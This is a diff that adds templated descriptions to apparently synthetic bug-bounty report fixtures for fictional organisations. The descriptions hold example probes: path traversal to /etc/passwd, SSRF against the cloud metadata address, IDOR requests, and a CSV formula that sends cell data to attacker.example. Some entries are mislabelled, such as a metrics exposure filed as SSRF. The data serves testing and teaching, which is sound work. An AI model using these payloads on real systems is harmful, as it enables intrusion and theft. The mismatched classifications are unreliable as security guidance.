+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://payments.rabenbrunn-it.foo/admin/queue`\n- Preconditions: authenticated user: citizen; app version: Auth 2025.09\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -24952,7 +25143,8 @@
           "offset": "0h",
           "message": "Initial submission with PoC and reproduction steps."
         }
-      ]
+      ],
+      "description": "A filename parameter is concatenated into a path without proper normalization, allowing traversal to system files.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://portal.rabenbrunn-it.foo/support/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: admin; app version: API 2.3\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request with file parameter using ../ traversal to system file.\n- Observe returned file content.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
@@ -25100,7 +25292,8 @@
           "offset": "0h",
           "message": "Initial submission with PoC and reproduction steps."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://portal.rabenbrunn-it.foo/fetch`\n- Preconditions: authenticated user: admin; app version: Service 1.8\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -25260,7 +25453,8 @@
           "offset": "2d 22h",
           "message": "Confirmed behavior on latest build; attaching version string."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://portal.rabenbrunn-it.foo/statements/`\n- Preconditions: authenticated user: radiologist; app version: API v2\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -25359,7 +25553,8 @@
           "offset": "4d 4h",
           "message": "Verified fix in Firefox and Safari; Chrome previously tested."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://payments.rabenbrunn-it.foo/fetch`\n- Preconditions: authenticated user: authenticated user; app version: Service 1.8\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -25515,7 +25710,8 @@
           "offset": "5d 19h",
           "message": "Shared curl one-liner to help reproduce quickly."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://portal.rabenbrunn-it.foo/admin/items`\n- Preconditions: authenticated user: radiologist; app version: Console 2025.09\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -25615,7 +25811,8 @@
           "offset": "12h",
           "message": "Included additional payload variant covering alternate render path."
         }
-      ]
+      ],
+      "description": "The /metrics endpoint is publicly accessible and includes identifiers in labels, exposing sensitive metadata.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://payments.rabenbrunn-it.foo/metrics`\n- Preconditions: authenticated user: radiologist; app version: API v2\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- GET /metrics and observe labels with identifiers.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -25759,7 +25956,8 @@
           "offset": "7d 9h",
           "message": "Re-tested on staging after patch; please confirm rollout window."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://portal.rabenbrunn-it.foo/import`\n- Preconditions: authenticated user: citizen; app version: Auth 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -25906,7 +26104,8 @@
           "offset": "6d 9h",
           "message": "Uploaded redacted logs illustrating server-side trace."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://portal.rabenbrunn-it.foo/api/documents/`\n- Preconditions: authenticated user: admin; app version: Console 2025.09\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -26045,7 +26244,8 @@
           "offset": "7d 10h",
           "message": "Confirmed behavior on latest build; attaching version string."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://payments.rabenbrunn-it.foo/v2/me`\n- Preconditions: authenticated user: admin; app version: API v2\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -26184,7 +26384,8 @@
           "offset": "6d 12h",
           "message": "Re-tested on staging after patch; please confirm rollout window."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://payments.rabenbrunn-it.foo/admin/items`\n- Preconditions: authenticated user: radiologist; app version: Auth 2025.09\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -26316,7 +26517,8 @@
           "offset": "4d 7h",
           "message": "Verified fix in Firefox and Safari; Chrome previously tested."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://portal.rabenbrunn-it.foo/console/queue`\n- Preconditions: authenticated user: radiologist; app version: Web 2025.09\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -26468,7 +26670,8 @@
           "offset": "6d 10h",
           "message": "Re-tested on staging after patch; please confirm rollout window."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://payments.rabenbrunn-it.foo/import`\n- Preconditions: authenticated user: radiologist; app version: Console 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -26596,7 +26799,8 @@
           "offset": "4d 9h",
           "message": "Uploaded redacted logs illustrating server-side trace."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://payments.rabenbrunn-it.foo/statements/`\n- Preconditions: authenticated user: admin; app version: API v2\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -26692,7 +26896,8 @@
           "offset": "1d 12h",
           "message": "Uploaded redacted logs illustrating server-side trace."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://payments.rabenbrunn-it.foo/console/queue`\n- Preconditions: authenticated user: radiologist; app version: API 2.3\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -26793,7 +26998,8 @@
           "offset": "6d 16h",
           "message": "Provided HAR with response headers and CSP for reference."
         }
-      ]
+      ],
+      "description": "The /metrics endpoint is publicly accessible and includes identifiers in labels, exposing sensitive metadata.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://payments.rabenbrunn-it.foo/metrics`\n- Preconditions: authenticated user: citizen; app version: Console 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- GET /metrics and observe labels with identifiers.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -26904,7 +27110,8 @@
           "offset": "4d 16h",
           "message": "Added sanitized PoC variant to avoid external calls."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://portal.rabenbrunn-it.foo/v2/me`\n- Preconditions: authenticated user: unauthenticated; app version: Service 1.8\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -27028,7 +27235,8 @@
           "offset": "0h",
           "message": "Initial submission with PoC and reproduction steps."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://payments.rabenbrunn-it.foo/statements/`\n- Preconditions: authenticated user: admin; app version: Portal 2025.09\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -27142,7 +27350,8 @@
           "offset": "2d 6h",
           "message": "Shared minimal HTML page to demonstrate issue reliably."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://portal.rabenbrunn-it.foo/api/documents/`\n- Preconditions: authenticated user: support agent; app version: Web 2025.09\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -27257,7 +27466,8 @@
           "offset": "2d 14h",
           "message": "Provided list of affected endpoints discovered during retest."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://payments.rabenbrunn-it.foo/api/import`\n- Preconditions: authenticated user: authenticated user; app version: API v2\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
diff --git a/fixtures/reports/rheinspitze_energie_reports.json b/fixtures/reports/rheinspitze_energie_reports.json
index fdd4048..9d991d5 100644
--- a/fixtures/reports/rheinspitze_energie_reports.json
+++ b/fixtures/reports/rheinspitze_energie_reports.json
@@ -55,7 +55,8 @@
           "offset": "3d 7h",
           "message": "Included additional payload variant covering alternate render path."
         }
-      ]
+      ],
+      "description": "GET /api/v1/meters/{meterId}/readings returns data for any meter if authenticated; lacks subject scoping.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://api.rheinspitze-energie.foo/api/v1/meters/`\n- Preconditions: authenticated user: authenticated customer; app version: API 1.5\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- GET /api/v1/meters/{myMeter}/readings -> 200\n- GET /api/v1/meters/{neighborMeter}/readings -> 200 (not mine)\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -200,7 +201,8 @@
           "offset": "5d 12h",
           "message": "Included additional payload variant covering alternate render path."
         }
-      ]
+      ],
+      "description": "The login flow accepts external URLs in the returnUrl parameter, enabling phishing chains and potential token leakage.\n\n### Technical analysis\n- Vulnerability class: **Open Redirect**\n- Affected target: `https://api.rheinspitze-energie.foo/login?returnUrl=https://evil.foo`\n- Preconditions: authenticated user: citizen; app version: API v2\n\n```http\nGET /login?returnUrl=https://attacker.example/collect HTTP/1.1\nHost: victim.example\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Open login with external returnUrl.\n- After authentication, observe 302 to attacker domain.\n\n### Recommendations\n- Validate `returnUrl` against a strict same-origin allowlist.\n- Use state/nonce; avoid reflecting external URLs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -331,7 +333,8 @@
           "offset": "2d 7h",
           "message": "Added sanitized PoC variant to avoid external calls."
         }
-      ]
+      ],
+      "description": "CSV export writes unescaped values; cells starting with =,+,-,@ are treated as formulas by spreadsheet apps, enabling exfiltration when opened.\n\n### Technical analysis\n- Vulnerability class: **CSV Formula Injection**\n- Affected target: `https://auth.rheinspitze-energie.foo/export?type=records`\n- Preconditions: authenticated user: authenticated user; app version: API v2\n\n```csv\n=HYPERLINK(\"https://attacker.example/?c=\"&ENCODEURL(A1))\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create a record with a field value beginning with a formula string.\n- Export CSV and open in Excel/LibreOffice; observe formula execution.\n\n### Recommendations\n- Prefix cells starting with `=,+,-,@` with a single quote.\n- Export CSV as text-safe or use TSV.\n"
     },
     "triager": {
       "status": "accepted",
@@ -466,7 +469,8 @@
           "offset": "3d 5h",
           "message": "Provided HAR with response headers and CSP for reference."
         }
-      ]
+      ],
+      "description": "The login flow accepts external URLs in the returnUrl parameter, enabling phishing chains and potential token leakage.\n\n### Technical analysis\n- Vulnerability class: **Open Redirect**\n- Affected target: `https://auth.rheinspitze-energie.foo/login?returnUrl=https://evil.foo`\n- Preconditions: authenticated user: admin; app version: API 2.3\n\n```http\nGET /login?returnUrl=https://attacker.example/collect HTTP/1.1\nHost: victim.example\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Open login with external returnUrl.\n- After authentication, observe 302 to attacker domain.\n\n### Recommendations\n- Validate `returnUrl` against a strict same-origin allowlist.\n- Use state/nonce; avoid reflecting external URLs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -569,7 +573,8 @@
           "offset": "0h",
           "message": "Minimal PoC attached; scope limited to in-scope assets."
         }
-      ]
+      ],
+      "description": "A filename parameter is concatenated into a path without proper normalization, allowing traversal to system files.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://api.rheinspitze-energie.foo/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: admin; app version: API 2.3\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request with file parameter using ../ traversal to system file.\n- Observe returned file content.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
@@ -664,7 +669,8 @@
           "offset": "1d 13h",
           "message": "Included additional payload variant covering alternate render path."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://api.rheinspitze-energie.foo/console/queue`\n- Preconditions: authenticated user: support agent; app version: API v2\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -808,7 +814,8 @@
           "offset": "6d 2h",
           "message": "Shared curl one-liner to help reproduce quickly."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://auth.rheinspitze-energie.foo/v2/me`\n- Preconditions: authenticated user: unauthenticated; app version: Mobile 2025.09\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -904,7 +911,8 @@
           "offset": "0h",
           "message": "Minimal PoC attached; scope limited to in-scope assets."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://auth.rheinspitze-energie.foo/console/queue`\n- Preconditions: authenticated user: admin; app version: Portal 2025.09\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -1031,7 +1039,8 @@
           "offset": "5d 7h",
           "message": "Shared curl one-liner to help reproduce quickly."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://api.rheinspitze-energie.foo/api/documents/`\n- Preconditions: authenticated user: radiologist; app version: Console 2025.09\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -1115,7 +1124,8 @@
           "offset": "0h",
           "message": "Initial submission with PoC and reproduction steps."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://auth.rheinspitze-energie.foo/v2/me`\n- Preconditions: authenticated user: authenticated user; app version: Mobile 2025.09\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -1247,7 +1257,8 @@
           "offset": "2d 12h",
           "message": "Confirmed behavior on latest build; attaching version string."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://api.rheinspitze-energie.foo/profile`\n- Preconditions: authenticated user: unauthenticated; app version: API v2\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -1383,7 +1394,8 @@
           "offset": "2d 10h",
           "message": "Provided HAR with response headers and CSP for reference."
